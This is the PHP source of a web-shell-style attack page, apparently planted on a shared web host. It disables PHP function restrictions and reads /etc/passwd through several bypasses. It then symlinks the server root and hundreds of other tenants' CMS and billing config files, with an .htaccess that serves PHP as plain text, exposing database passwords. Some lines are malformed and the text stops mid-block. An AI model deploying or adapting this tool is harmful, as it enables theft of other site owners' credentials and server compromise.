<center>

<?php
$php_ini = fopen('php.ini', 'a+');

fwrite($php_ini,"disable_functions=none\n");
fclose($php_ini);
unset($php_ini);

$user_ini = fopen('user.ini', 'a+');

fwrite($user_ini,"disable_functions=none\n");
fclose($user_ini);
unset($user_ini);
?>
<body bgcolor="black">
</body>
<style>
alabörü{
  background-color: #240000;
  box-shadow:1px 1px 5px 3px #ab2424;
  color:white;
}
yazi{
    color:red;
    font-size:5px;
}
yesil{
    color:white;
    text-shadow:gray 1px 1px 10px;
    background-color:#030303;   
}
.yesil{
    color:white;
    text-shadow:gray 1px 1px 10px;
    background-color:#030303;   
}
textarea{
    color:white;
    text-shadow:gray 1px 1px 10px;
    background-color:#030303;
}
.button{
  background-color: #040404;
  border: none;
  padding: 5px 10px;
  margin: 4px 2px;
  color: white;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  cursor: pointer;

}
hr{
    border-color:green;
    box-shadow:green 1px 1px 10px 1px;
}
pswd{
    color:white;
    text-shadow:gray 1px 1px 10px;
    background-color:#010101;
}
sym{
    color:white;
    text-shadow:black 1px 1px 10px;
}
div{
  border-left: 6px solid #333333;
  background-color: #030303;
  box-shadow:1px 1px 5px 3px #262626;
}
q{
    color:#525252;
    text-shadow:white;
}
a{
    text-decoration:none
}
</style>
<?php
echo("<pswd>Passwd:</pswd><br>");
?>
<form name="bypass" method="post">
<input name="bypass_1" type="submit" class="button" value="ByPass-1"></input>
<input name="bypass_2" type="submit" class="button" value="ByPass-2"></input>
<input name="bypass_3" type="submit" class="button" value="ByPass-3"></input>
<input name="bypass_4" type="submit" class="button" value="ByPass-4"></input>

</form>
<form method="post" name="pwds">
<textarea method="post" name="pwds" id="pwds" rows="40" cols="100" style="margin: 0px; height: 252px; width: 507px;">
<?php
if (isset($_POST['bypass_1'])) {
    system("ln -s /etc/passwd passwd.txt");
    $dosya = fopen('passwd.txt', 'r');
    $icerik = fread($dosya, filesize('passwd.txt'));
    echo($icerik);
    unset($dosya,$icerik);
}
elseif(isset($_POST['bypass_2'])){
    system("cat /e*t*c/p*a*s*s*w*d");
}
elseif(isset($_POST['bypass_3'])){
    $dosya = fopen('/etc/passwd', 'r');
    $icerik = fread($dosya, filesize('/etc/passwd'));
    echo($icerik);
    unset($dosya,$icerik);
}
elseif(isset($_POST['bypass_4'])){
    for($uid=0;$uid<60000;$uid++){
        $ara = posix_getpwuid($uid);
        if (!empty($ara)) {
        while (list ($key, $val) = each($ara)){
        print "$val:";
        }
        print "n";
        }
        }
}
else 
{
    system("cat /etc/passwd");
}
?>
</textarea>
</form>
<br>
<center>
<form method="post">
<textarea name="passwd" style="margin: 0px; width: 268px; height: 65px;">/ETC/PASSWD</textarea><br>
<input method="post" name="SYMLİNK" type="submit" class="button" value="SYMLİNK">
<input method="post" name="HTDOCS-SYMLİNK" type="submit" class="button" value="HTDOCS-SYMLİNK">
<input method="post" name="HTDOCS-SYMLİNK2" type="submit" class="button" value="HTDOCS-SYMLİNK2">
<input method="post" name="VHOSTS-SYMLİNK" type="submit" class="button" value="VHOSTS-SYMLİNK">
<input method="post" name="VHOSTS-SYMLİNK2" type="submit" class="button" value="VHOSTS-SYMLİNK2">
</form>
</center>
<?php
if(isset($_POST['SYMLİNK'])){
    $hta ="Options Indexes Follow symlinks
    DirectoryIndex ngeue.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any";
    mkdir("sömürüldü");
    chdir("sömürüldü");
    @file_put_contents(".htaccess",$hta);
    system("ln -s / root");
    mkdir("symlinkler");
    chdir("symlinkler");
    @file_put_contents(".htaccess",$hta);
    unset($hta);
    foreach($_POST['passwd'] as $pwd){
        $pawd=explode(":",$pwd);
        $kullanici =$pawd[0];
       symlink('/home/'.$kullanici.'/public_html/includes/configure.php'.$kullanici.'-shop.txt');
       symlink('/home/'.$kullanici.'/public_html/os/includes/configure.php'.$kullanici.'-shop-os.txt');
       symlink('/home/'.$kullanici.'/public_html/oscom/includes/configure.php'.$kullanici.'-oscom.txt');
       symlink('/home/'.$kullanici.'/public_html/oscommerce/includes/configure.php'.$kullanici.'-oscommerce.txt');
       symlink('/home/'.$kullanici.'/public_html/oscommerces/includes/configure.php'.$kullanici.'-oscommerces.txt');
       symlink('/home/'.$kullanici.'/public_html/shop/includes/configure.php'.$kullanici.'-shop2.txt');
       symlink('/home/'.$kullanici.'/public_html/shopping/includes/configure.php'.$kullanici.'-shop-shopping.txt');
       symlink('/home/'.$kullanici.'/public_html/sale/includes/configure.php'.$kullanici.'-sale.txt');
       symlink('/home/'.$kullanici.'/public_html/amember/config.inc.php'.$kullanici.'-amember.txt');
       symlink('/home/'.$kullanici.'/public_html/config.inc.php'.$kullanici.'-amember2.txt');
       symlink('/home/'.$kullanici.'/public_html/members/configuration.php'.$kullanici.'-members.txt');
       symlink('/home/'.$kullanici.'/public_html/config.php'.$kullanici.'-4images1.txt');
       symlink('/home/'.$kullanici.'/public_html/forum/includes/config.php'.$kullanici.'-forum.txt');
       symlink('/home/'.$kullanici.'/public_html/forums/includes/config.php'.$kullanici.'-forums.txt');
       symlink('/home/'.$kullanici.'/public_html/admin/conf.php'.$kullanici.'-5.txt');
       symlink('/home/'.$kullanici.'/public_html/admin/config.php'.$kullanici.'-4.txt');
       symlink('/home/'.$kullanici.'/public_html/wp-config.php'.$kullanici.'-wp13.txt');
       symlink('/home/'.$kullanici.'/public_html/wp/wp-config.php'.$kullanici.'-wp13-wp.txt');
       symlink('/home/'.$kullanici.'/public_html/WP/wp-config.php'.$kullanici.'-wp13-WP.txt');
       symlink('/home/'.$kullanici.'/public_html/wp/beta/wp-config.php'.$kullanici.'-wp13-wp-beta.txt');
       symlink('/home/'.$kullanici.'/public_html/beta/wp-config.php'.$kullanici.'-wp13-beta.txt');
       symlink('/home/'.$kullanici.'/public_html/press/wp-config.php'.$kullanici.'-wp13-press.txt');
       symlink('/home/'.$kullanici.'/public_html/wordpress/wp-config.php'.$kullanici.'-wp13-wordpress.txt');
       symlink('/home/'.$kullanici.'/public_html/Wordpress/wp-config.php'.$kullanici.'-wp13-Wordpress.txt');
       symlink('/home/'.$kullanici.'/public_html/blog/wp-config.php'.$kullanici.'-wp13-Wordpress.txt');
       symlink('/home/'.$kullanici.'/public_html/wordpress/beta/wp-config.php'.$kullanici.'-wp13-wordpress-beta.txt');
       symlink('/home/'.$kullanici.'/public_html/news/wp-config.php'.$kullanici.'-wp13-news.txt');
       symlink('/home/'.$kullanici.'/public_html/new/wp-config.php'.$kullanici.'-wp13-new.txt');
       symlink('/home/'.$kullanici.'/public_html/blog/wp-config.php'.$kullanici.'-wp-blog.txt');
       symlink('/home/'.$kullanici.'/public_html/beta/wp-config.php'.$kullanici.'-wp-beta.txt');
       symlink('/home/'.$kullanici.'/public_html/blogs/wp-config.php'.$kullanici.'-wp-blogs.txt');
       symlink('/home/'.$kullanici.'/public_html/home/wp-config.php'.$kullanici.'-wp-home.txt');
       symlink('/home/'.$kullanici.'/public_html/protal/wp-config.php'.$kullanici.'-wp-protal.txt');
       symlink('/home/'.$kullanici.'/public_html/site/wp-config.php'.$kullanici.'-wp-site.txt');
       symlink('/home/'.$kullanici.'/public_html/main/wp-config.php'.$kullanici.'-wp-main.txt');
       symlink('/home/'.$kullanici.'/public_html/test/wp-config.php'.$kullanici.'-wp-test.txt');
       symlink('/home/'.$kullanici.'/public_html/arcade/functions/dbclass.php'.$kullanici.'-ibproarcade.txt');
       symlink('/home/'.$kullanici.'/public_html/arcade/functions/dbclass.php'.$kullanici.'-ibproarcade.txt');
       symlink('/home/'.$kullanici.'/public_html/joomla/configuration.php'.$kullanici.'-joomla2.txt');
       symlink('/home/'.$kullanici.'/public_html/protal/configuration.php'.$kullanici.'-joomla-protal.txt');
       symlink('/home/'.$kullanici.'/public_html/joo/configuration.php'.$kullanici.'-joo.txt');
       symlink('/home/'.$kullanici.'/public_html/cms/configuration.php'.$kullanici.'-joomla-cms.txt');
       symlink('/home/'.$kullanici.'/public_html/site/configuration.php'.$kullanici.'-joomla-site.txt');
       symlink('/home/'.$kullanici.'/public_html/main/configuration.php'.$kullanici.'-joomla-main.txt');
       symlink('/home/'.$kullanici.'/public_html/news/configuration.php'.$kullanici.'-joomla-news.txt');
       symlink('/home/'.$kullanici.'/public_html/new/configuration.php'.$kullanici.'-joomla-new.txt');
       symlink('/home/'.$kullanici.'/public_html/home/configuration.php'.$kullanici.'-joomla-home.txt');
       symlink('/home/'.$kullanici.'/public_html/vb/includes/config.php'.$kullanici.'-vb-config.txt');
       symlink('/home/'.$kullanici.'/public_html/vb3/includes/config.php'.$kullanici.'-vb3-config.txt');
       symlink('/home/'.$kullanici.'/public_html/cc/includes/config.php'.$kullanici.'-vb1-config.txt');
       symlink('/home/'.$kullanici.'/public_html/includes/config.php'.$kullanici.'-includes-vb.txt');
       symlink('/home/'.$kullanici.'/public_html/forum/includes/class_core.php'.$kullanici.'-vbluttin-class_core.php.txt');
       symlink('/home/'.$kullanici.'/public_html/vb/includes/class_core.php'.$kullanici.'-vbluttin-class_core.php1.txt');
       symlink('/home/'.$kullanici.'/public_html/cc/includes/class_core.php'.$kullanici.'-vbluttin-class_core.php2.txt');
       symlink('/home/'.$kullanici.'/public_html/whm/configuration.php'.$kullanici.'-whm15.txt');
       symlink('/home/'.$kullanici.'/public_html/central/configuration.php'.$kullanici.'-whm-central.txt');
       symlink('/home/'.$kullanici.'/public_html/whm/whmcs/configuration.php'.$kullanici.'-whm-whmcs.txt');
       symlink('/home/'.$kullanici.'/public_html/whm/WHMCS/configuration.php'.$kullanici.'-whm-WHMCS.txt');
       symlink('/home/'.$kullanici.'/public_html/whmc/WHM/configuration.php'.$kullanici.'-whmc-WHM.txt');
       symlink('/home/'.$kullanici.'/public_html/whmcs/configuration.php'.$kullanici.'-whmcs.txt');
       symlink('/home/'.$kullanici.'/public_html/support/configuration.php'.$kullanici.'-support.txt');
       symlink('/home/'.$kullanici.'/public_html/supp/configuration.php'.$kullanici.'-supp.txt');
       symlink('/home/'.$kullanici.'/public_html/secure/configuration.php'.$kullanici.'-sucure.txt');
       symlink('/home/'.$kullanici.'/public_html/secure/whm/configuration.php'.$kullanici.'-sucure-whm.txt');
       symlink('/home/'.$kullanici.'/public_html/secure/whmcs/configuration.php'.$kullanici.'-sucure-whmcs.txt');
       symlink('/home/'.$kullanici.'/public_html/cpanel/configuration.php'.$kullanici.'-cpanel.txt');
       symlink('/home/'.$kullanici.'/public_html/panel/configuration.php'.$kullanici.'-panel.txt');
       symlink('/home/'.$kullanici.'/public_html/host/configuration.php'.$kullanici.'-host.txt');
       symlink('/home/'.$kullanici.'/public_html/hosting/configuration.php'.$kullanici.'-hosting.txt');
       symlink('/home/'.$kullanici.'/public_html/hosts/configuration.php'.$kullanici.'-hosts.txt');
       symlink('/home/'.$kullanici.'/public_html/configuration.php'.$kullanici.'-joomla.txt');
       symlink('/home/'.$kullanici.'/public_html/submitticket.php'.$kullanici.'-whmcs2.txt');
       symlink('/home/'.$kullanici.'/public_html/clients/configuration.php'.$kullanici.'-clients.txt');
       symlink('/home/'.$kullanici.'/public_html/client/configuration.php'.$kullanici.'-client.txt');
       symlink('/home/'.$kullanici.'/public_html/clientes/configuration.php'.$kullanici.'-clientes.txt');
       symlink('/home/'.$kullanici.'/public_html/cliente/configuration.php'.$kullanici.'-client.txt');
       symlink('/home/'.$kullanici.'/public_html/clientsupport/configuration.php'.$kullanici.'-clientsupport.txt');
       symlink('/home/'.$kullanici.'/public_html/billing/configuration.php'.$kullanici.'-billing.txt'); 
       symlink('/home/'.$kullanici.'/public_html/manage/configuration.php'.$kullanici.'-whm-manage.txt'); 
       symlink('/home/'.$kullanici.'/public_html/my/configuration.php'.$kullanici.'-whm-my.txt'); 
       symlink('/home/'.$kullanici.'/public_html/myshop/configuration.php'.$kullanici.'-whm-myshop.txt'); 
       symlink('/home/'.$kullanici.'/public_html/includes/dist-configure.php'.$kullanici.'-zencart.txt'); 
       symlink('/home/'.$kullanici.'/public_html/zencart/includes/dist-configure.php'.$kullanici.'-shop-zencart.txt'); 
       symlink('/home/'.$kullanici.'/public_html/shop/includes/dist-configure.php'.$kullanici.'-shop-ZCshop.txt'); 
       symlink('/home/'.$kullanici.'/public_html/Settings.php'.$kullanici.'-smf.txt'); 
       symlink('/home/'.$kullanici.'/public_html/smf/Settings.php'.$kullanici.'-smf2.txt'); 
       symlink('/home/'.$kullanici.'/public_html/forum/Settings.php'.$kullanici.'-smf-forum.txt'); 
       symlink('/home/'.$kullanici.'/public_html/forums/Settings.php'.$kullanici.'-smf-forums.txt'); 
       symlink('/home/'.$kullanici.'/public_html/upload/includes/config.php'.$kullanici.'-up.txt');
       symlink('/home/'.$kullanici.'/public_html/article/config.php'.$kullanici.'-Nwahy.txt'); 
       symlink('/home/'.$kullanici.'/public_html/up/includes/config.php'.$kullanici.'-up2.txt');
       symlink('/home/'.$kullanici.'/public_html/conf_global.php'.$kullanici.'-6.txt');
       symlink('/home/'.$kullanici.'/public_html/include/db.php'.$kullanici.'-7.txt');
       symlink('/home/'.$kullanici.'/public_html/connect.php'.$kullanici.'-PHP-Fusion.txt');
       symlink('/home/'.$kullanici.'/public_html/mk_conf.php'.$kullanici.'-9.txt');
       symlink('/home/'.$kullanici.'/public_html/includes/config.php'.$kullanici.'-traidnt1.txt');
       symlink('/home/'.$kullanici.'/public_html/config.php'.$kullanici.'-4images.txt');
       symlink('/home/'.$kullanici.'/public_html/sites/default/settings.php'.$kullanici.'-Drupal.txt');
       symlink('/home/'.$kullanici.'/public_html/member/configuration.php'.$kullanici.'-1member.txt') ; 
       symlink('/home/'.$kullanici.'/public_html/billings/configuration.php'.$kullanici.'-billings.txt') ; 
       symlink('/home/'.$kullanici.'/public_html/whm/configuration.php'.$kullanici.'-whm.txt');
       symlink('/home/'.$kullanici.'/public_html/supports/configuration.php'.$kullanici.'-supports.txt');
       symlink('/home/'.$kullanici.'/public_html/requires/config.php'.$kullanici.'-AM4SS-hosting.txt');
       symlink('/home/'.$kullanici.'/public_html/supports/includes/iso4217.php'.$kullanici.'-hostbills-supports.txt');
       symlink('/home/'.$kullanici.'/public_html/client/includes/iso4217.php'.$kullanici.'-hostbills-client.txt');
       symlink('/home/'.$kullanici.'/public_html/support/includes/iso4217.php'.$kullanici.'-hostbills-support.txt');
       symlink('/home/'.$kullanici.'/public_html/billing/includes/iso4217.php'.$kullanici.'-hostbills-billing.txt');
       symlink('/home/'.$kullanici.'/public_html/billings/includes/iso4217.php'.$kullanici.'-hostbills-billings.txt');
       symlink('/home/'.$kullanici.'/public_html/host/includes/iso4217.php'.$kullanici.'-hostbills-host.txt');
       symlink('/home/'.$kullanici.'/public_html/hosts/includes/iso4217.php'.$kullanici.'-hostbills-hosts.txt');
       symlink('/home/'.$kullanici.'/public_html/hosting/includes/iso4217.php'.$kullanici.'-hostbills-hosting.txt');
       symlink('/home/'.$kullanici.'/public_html/hostings/includes/iso4217.php'.$kullanici.'-hostbills-hostings.txt');
       symlink('/home/'.$kullanici.'/public_html/includes/iso4217.php'.$kullanici.'-hostbills.txt');
       symlink('/home/'.$kullanici.'/public_html/hostbills/includes/iso4217.php'.$kullanici.'-hostbills-hostbills.txt');
       symlink('/home/'.$kullanici.'/public_html/hostbill/includes/iso4217.php'.$kullanici.'-hostbills-hostbill.txt');
    }
    echo("<center><a target='__newblank' href='sömürüldü/root/'><q>Root</q></a></center>");
    echo("<hr>");
    echo("<center><a target='__newblank' href='sömürüldü/symlinkler/'><q>symlinkler</q></a></center>");
}
if(isset($_POST['HTDOCS-SYMLİNK'])){
    mkdir("htdocs-sömürüldü");
    chdir("htdocs-sömürüldü");
    $hta ="Options Indexes Follow symlinks
    DirectoryIndex ngeue.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any";
    @file_put_contents(".htaccess",$hta);
    system("ln -s / root");
    mkdir("symlinkler");
    chdir("symlinkler");
    @file_put_contents(".htaccess",$hta);
    unset($hta);
    $pawd=explode(":",$_POST['passwd']);
    foreach($pawd as $pw){
        $pawd=explode(":",$pw);
        $isim = $pawd[0];
        $rep = preg_replace('/\/var\/www\/vhosts\//', '', $isim);   
        if(preg_match('/vhosts/',$isim)){
            system("ln -s ".$isim."/httpdocs/wp-config.php ".$rep."-Wordpress.txt");
            system("ln -s ".$isim."/httpdocs/configuration.php ".$rep."-Joomla.txt");
            system("ln -s ".$isim."/httpdocs/config/koneksi.php ".$rep."-Lokomedia.txt");
            system("ln -s ".$isim."/httpdocs/forum/config.php ".$rep."-phpBB.txt");
            system("ln -s ".$isim."/httpdocs/sites/default/settings.php ".$rep."-Drupal.txt");
            system("ln -s ".$isim."/httpdocs/config/settings.inc.php ".$rep."-PrestaShop.txt");
            system("ln -s ".$isim."/httpdocs/app/etc/local.xml ".$rep."-Magento.txt");
            system("ln -s ".$isim."/httpdocs/admin/config.php ".$rep."-OpenCart.txt");
            system("ln -s ".$isim."/httpdocs/config.php ".$rep."-OpenCart1.txt");
            system("ln -s ".$isim."/httpdocs/application/config/database.php ".$rep."-Ellislab.txt");
            system("ln -s ".$isim."/httpdocs/inc/connect.php ".$rep."-Parallels.txt");
            system("ln -s ".$isim."/httpdocs/inc/config.php ".$rep."-MyBB.txt");
            system('ln -s'.$isim.'/httpdocs/includes/configure.php'.$rep.'-shop.txt');
            system('ln -s'.$isim.'/httpdocs/os/includes/configure.php'.$rep.'-shop-os.txt');
            system('ln -s'.$isim.'/httpdocs/oscom/includes/configure.php'.$rep.'-oscom.txt');
            system('ln -s'.$isim.'/httpdocs/oscommerce/includes/configure.php'.$rep.'-oscommerce.txt');
            system('ln -s'.$isim.'/httpdocs/oscommerces/includes/configure.php'.$rep.'-oscommerces.txt');
            system('ln -s'.$isim.'/httpdocs/shop/includes/configure.php'.$rep.'-shop2.txt');
            system('ln -s'.$isim.'/httpdocs/shopping/includes/configure.php'.$rep.'-shop-shopping.txt');
            system('ln -s'.$isim.'/httpdocs/sale/includes/configure.php'.$rep.'-sale.txt');
            system('ln -s'.$isim.'/httpdocs/amember/config.inc.php'.$rep.'-amember.txt');
            system('ln -s'.$isim.'/httpdocs/config.inc.php'.$rep.'-amember2.txt');
            system('ln -s'.$isim.'/httpdocs/members/configuration.php'.$rep.'-members.txt');
            system('ln -s'.$isim.'/httpdocs/config.php'.$rep.'-4images1.txt');
            system('ln -s'.$isim.'/httpdocs/forum/includes/config.php'.$rep.'-forum.txt');
            system('ln -s'.$isim.'/httpdocs/forums/includes/config.php'.$rep.'-forums.txt');
            system('ln -s'.$isim.'/httpdocs/admin/conf.php'.$rep.'-5.txt');
            system('ln -s'.$isim.'/httpdocs/admin/config.php'.$rep.'-4.txt');
            system('ln -s'.$isim.'/httpdocs/wp-config.php'.$rep.'-wp13.txt');
            system('ln -s'.$isim.'/httpdocs/wp/wp-config.php'.$rep.'-wp13-wp.txt');
            system('ln -s'.$isim.'/httpdocs/WP/wp-config.php'.$rep.'-wp13-WP.txt');
            system('ln -s'.$isim.'/httpdocs/wp/beta/wp-config.php'.$rep.'-wp13-wp-beta.txt');
            system('ln -s'.$isim.'/httpdocs/beta/wp-config.php'.$rep.'-wp13-beta.txt');
            system('ln -s'.$isim.'/httpdocs/press/wp-config.php'.$rep.'-wp13-press.txt');
            system('ln -s'.$isim.'/httpdocs/wordpress/wp-config.php'.$rep.'-wp13-wordpress.txt');
            system('ln -s'.$isim.'/httpdocs/Wordpress/wp-config.php'.$rep.'-wp13-Wordpress.txt');
            system('ln -s'.$isim.'/httpdocs/blog/wp-config.php'.$rep.'-wp13-Wordpress.txt');
            system('ln -s'.$isim.'/httpdocs/wordpress/beta/wp-config.php'.$rep.'-wp13-wordpress-beta.txt');
            system('ln -s'.$isim.'/httpdocs/news/wp-config.php'.$rep.'-wp13-news.txt');
            system('ln -s'.$isim.'/httpdocs/new/wp-config.php'.$rep.'-wp13-new.txt');
            system('ln -s'.$isim.'/httpdocs/blog/wp-config.php'.$rep.'-wp-blog.txt');
            system('ln -s'.$isim.'/httpdocs/beta/wp-config.php'.$rep.'-wp-beta.txt');
            system('ln -s'.$isim.'/httpdocs/blogs/wp-config.php'.$rep.'-wp-blogs.txt');
            system('ln -s'.$isim.'/httpdocsln -swp-config.php'.$rep.'-wp-home.txt');
            system('ln -s'.$isim.'/httpdocs/protal/wp-config.php'.$rep.'-wp-protal.txt');
            system('ln -s'.$isim.'/httpdocs/site/wp-config.php'.$rep.'-wp-site.txt');
            system('ln -s'.$isim.'/httpdocs/main/wp-config.php'.$rep.'-wp-main.txt');
            system('ln -s'.$isim.'/httpdocs/test/wp-config.php'.$rep.'-wp-test.txt');
            system('ln -s'.$isim.'/httpdocs/arcade/functions/dbclass.php'.$rep.'-ibproarcade.txt');
            system('ln -s'.$isim.'/httpdocs/arcade/functions/dbclass.php'.$rep.'-ibproarcade.txt');
            system('ln -s'.$isim.'/httpdocs/joomla/configuration.php'.$rep.'-joomla2.txt');
            system('ln -s'.$isim.'/httpdocs/protal/configuration.php'.$rep.'-joomla-protal.txt');
            system('ln -s'.$isim.'/httpdocs/joo/configuration.php'.$rep.'-joo.txt');
            system('ln -s'.$isim.'/httpdocs/cms/configuration.php'.$rep.'-joomla-cms.txt');
            system('ln -s'.$isim.'/httpdocs/site/configuration.php'.$rep.'-joomla-site.txt');
            system('ln -s'.$isim.'/httpdocs/main/configuration.php'.$rep.'-joomla-main.txt');
            system('ln -s'.$isim.'/httpdocs/news/configuration.php'.$rep.'-joomla-news.txt');
            system('ln -s'.$isim.'/httpdocs/new/configuration.php'.$rep.'-joomla-new.txt');
            system('ln -s'.$isim.'/httpdocsln -sconfiguration.php'.$rep.'-joomla-home.txt');
            system('ln -s'.$isim.'/httpdocs/vb/includes/config.php'.$rep.'-vb-config.txt');
            system('ln -s'.$isim.'/httpdocs/vb3/includes/config.php'.$rep.'-vb3-config.txt');
            system('ln -s'.$isim.'/httpdocs/cc/includes/config.php'.$rep.'-vb1-config.txt');
            system('ln -s'.$isim.'/httpdocs/includes/config.php'.$rep.'-includes-vb.txt');
            system('ln -s'.$isim.'/httpdocs/forum/includes/class_core.php'.$rep.'-vbluttin-class_core.php.txt');
            system('ln -s'.$isim.'/httpdocs/vb/includes/class_core.php'.$rep.'-vbluttin-class_core.php1.txt');
            system('ln -s'.$isim.'/httpdocs/cc/includes/class_core.php'.$rep.'-vbluttin-class_core.php2.txt');
            system('ln -s'.$isim.'/httpdocs/whm/configuration.php'.$rep.'-whm15.txt');
            system('ln -s'.$isim.'/httpdocs/central/configuration.php'.$rep.'-whm-central.txt');
            system('ln -s'.$isim.'/httpdocs/whm/whmcs/configuration.php'.$rep.'-whm-whmcs.txt');
            system('ln -s'.$isim.'/httpdocs/whm/WHMCS/configuration.php'.$rep.'-whm-WHMCS.txt');
            system('ln -s'.$isim.'/httpdocs/whmc/WHM/configuration.php'.$rep.'-whmc-WHM.txt');
            system('ln -s'.$isim.'/httpdocs/whmcs/configuration.php'.$rep.'-whmcs.txt');
            system('ln -s'.$isim.'/httpdocs/support/configuration.php'.$rep.'-support.txt');
            system('ln -s'.$isim.'/httpdocs/supp/configuration.php'.$rep.'-supp.txt');
            system('ln -s'.$isim.'/httpdocs/secure/configuration.php'.$rep.'-sucure.txt');
            system('ln -s'.$isim.'/httpdocs/secure/whm/configuration.php'.$rep.'-sucure-whm.txt');
            system('ln -s'.$isim.'/httpdocs/secure/whmcs/configuration.php'.$rep.'-sucure-whmcs.txt');
            system('ln -s'.$isim.'/httpdocs/cpanel/configuration.php'.$rep.'-cpanel.txt');
            system('ln -s'.$isim.'/httpdocs/panel/configuration.php'.$rep.'-panel.txt');
            system('ln -s'.$isim.'/httpdocs/host/configuration.php'.$rep.'-host.txt');
            system('ln -s'.$isim.'/httpdocs/hosting/configuration.php'.$rep.'-hosting.txt');
            system('ln -s'.$isim.'/httpdocs/hosts/configuration.php'.$rep.'-hosts.txt');
            system('ln -s'.$isim.'/httpdocs/configuration.php'.$rep.'-joomla.txt');
            system('ln -s'.$isim.'/httpdocs/submitticket.php'.$rep.'-whmcs2.txt');
            system('ln -s'.$isim.'/httpdocs/clients/configuration.php'.$rep.'-clients.txt');
            system('ln -s'.$isim.'/httpdocs/client/configuration.php'.$rep.'-client.txt');
            system('ln -s'.$isim.'/httpdocs/clientes/configuration.php'.$rep.'-clientes.txt');
            system('ln -s'.$isim.'/httpdocs/cliente/configuration.php'.$rep.'-client.txt');
            system('ln -s'.$isim.'/httpdocs/clientsupport/configuration.php'.$rep.'-clientsupport.txt');
            system('ln -s'.$isim.'/httpdocs/billing/configuration.php'.$rep.'-billing.txt'); 
            system('ln -s'.$isim.'/httpdocs/manage/configuration.php'.$rep.'-whm-manage.txt'); 
            system('ln -s'.$isim.'/httpdocs/my/configuration.php'.$rep.'-whm-my.txt'); 
            system('ln -s'.$isim.'/httpdocs/myshop/configuration.php'.$rep.'-whm-myshop.txt'); 
            system('ln -s'.$isim.'/httpdocs/includes/dist-configure.php'.$rep.'-zencart.txt'); 
            system('ln -s'.$isim.'/httpdocs/zencart/includes/dist-configure.php'.$rep.'-shop-zencart.txt'); 
            system('ln -s'.$isim.'/httpdocs/shop/includes/dist-configure.php'.$rep.'-shop-ZCshop.txt'); 
            system('ln -s'.$isim.'/httpdocs/Settings.php'.$rep.'-smf.txt'); 
            system('ln -s'.$isim.'/httpdocs/smf/Settings.php'.$rep.'-smf2.txt'); 
            system('ln -s'.$isim.'/httpdocs/forum/Settings.php'.$rep.'-smf-forum.txt'); 
            system('ln -s'.$isim.'/httpdocs/forums/Settings.php'.$rep.'-smf-forums.txt'); 
            system('ln -s'.$isim.'/httpdocs/upload/includes/config.php'.$rep.'-up.txt');
            system('ln -s'.$isim.'/httpdocs/article/config.php'.$rep.'-Nwahy.txt'); 
            system('ln -s'.$isim.'/httpdocs/up/includes/config.php'.$rep.'-up2.txt');
            system('ln -s'.$isim.'/httpdocs/conf_global.php'.$rep.'-6.txt');
            system('ln -s'.$isim.'/httpdocs/include/db.php'.$rep.'-7.txt');
            system('ln -s'.$isim.'/httpdocs/connect.php'.$rep.'-PHP-Fusion.txt');
            system('ln -s'.$isim.'/httpdocs/mk_conf.php'.$rep.'-9.txt');
            system('ln -s'.$isim.'/httpdocs/includes/config.php'.$rep.'-traidnt1.txt');
            system('ln -s'.$isim.'/httpdocs/config.php'.$rep.'-4images.txt');
            system('ln -s'.$isim.'/httpdocs/sites/default/settings.php'.$rep.'-Drupal.txt');
            system('ln -s'.$isim.'/httpdocs/member/configuration.php'.$rep.'-1member.txt') ; 
            system('ln -s'.$isim.'/httpdocs/billings/configuration.php'.$rep.'-billings.txt') ; 
            system('ln -s'.$isim.'/httpdocs/whm/configuration.php'.$rep.'-whm.txt');
            system('ln -s'.$isim.'/httpdocs/supports/configuration.php'.$rep.'-supports.txt');
            system('ln -s'.$isim.'/httpdocs/requires/config.php'.$rep.'-AM4SS-hosting.txt');
            system('ln -s'.$isim.'/httpdocs/supports/includes/iso4217.php'.$rep.'-hostbills-supports.txt');
            system('ln -s'.$isim.'/httpdocs/client/includes/iso4217.php'.$rep.'-hostbills-client.txt');
            system('ln -s'.$isim.'/httpdocs/support/includes/iso4217.php'.$rep.'-hostbills-support.txt');
            system('ln -s'.$isim.'/httpdocs/billing/includes/iso4217.php'.$rep.'-hostbills-billing.txt');
            system('ln -s'.$isim.'/httpdocs/billings/includes/iso4217.php'.$rep.'-hostbills-billings.txt');
            system('ln -s'.$isim.'/httpdocs/host/includes/iso4217.php'.$rep.'-hostbills-host.txt');
            system('ln -s'.$isim.'/httpdocs/hosts/includes/iso4217.php'.$rep.'-hostbills-hosts.txt');
            system('ln -s'.$isim.'/httpdocs/hosting/includes/iso4217.php'.$rep.'-hostbills-hosting.txt');
            system('ln -s'.$isim.'/httpdocs/hostings/includes/iso4217.php'.$rep.'-hostbills-hostings.txt');
            system('ln -s'.$isim.'/httpdocs/includes/iso4217.php'.$rep.'-hostbills.txt');
            system('ln -s'.$isim.'/httpdocs/hostbills/includes/iso4217.php'.$rep.'-hostbills-hostbills.txt');
            system('ln -s'.$isim.'/httpdocs/hostbill/includes/iso4217.php'.$rep.'-hostbills-hostbill.txt');
    }
}
echo("<center><a target='__newblank' href='htdocs-sömürüldü/root/'><q>Root</q></a></center>");
echo("<hr>");
echo("<center><a target='___newblank' href='htdocs-sömürüldü/symlinkler/'><q>symlinkler</q></a></center>");
}
if(isset($_POST['HTDOCS-SYMLİNK2'])){
    mkdir("htdocs-sömürüldü2");
    chdir("htdocs-sömürüldü2");
    $hta ="Options Indexes Follow symlinks
    DirectoryIndex ngeue.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any";
    @file_put_contents(".htaccess",$hta);
    system("ln -s / root");
    mkdir("symlinkler");
    chdir("symlinkler");
    @file_put_contents(".htaccess",$hta);
    unset($hta);
    $pawd=explode(":",$_POST['passwd']);
    foreach($pawd as $pw){
        $pawd=explode(":",$pw);
        $isim = $pawd[0];
        $rep = preg_replace('/\/var\/www\/vhosts\//', '', $isim);   
        if(preg_match('/vhosts/i',$isim)){
            system("ln -s ".$isim."/httpdocs/wp-config.php ".$rep."-Wordpress.txt");
            system("ln -s ".$isim."/httpdocs/configuration.php ".$rep."-Joomla.txt");
            system("ln -s ".$isim."/httpdocs/config/koneksi.php ".$rep."-Lokomedia.txt");
            system("ln -s ".$isim."/httpdocs/forum/config.php ".$rep."-phpBB.txt");
            system("ln -s ".$isim."/httpdocs/sites/default/settings.php ".$rep."-Drupal.txt");
            system("ln -s ".$isim."/httpdocs/config/settings.inc.php ".$rep."-PrestaShop.txt");
            system("ln -s ".$isim."/httpdocs/app/etc/local.xml ".$rep."-Magento.txt");
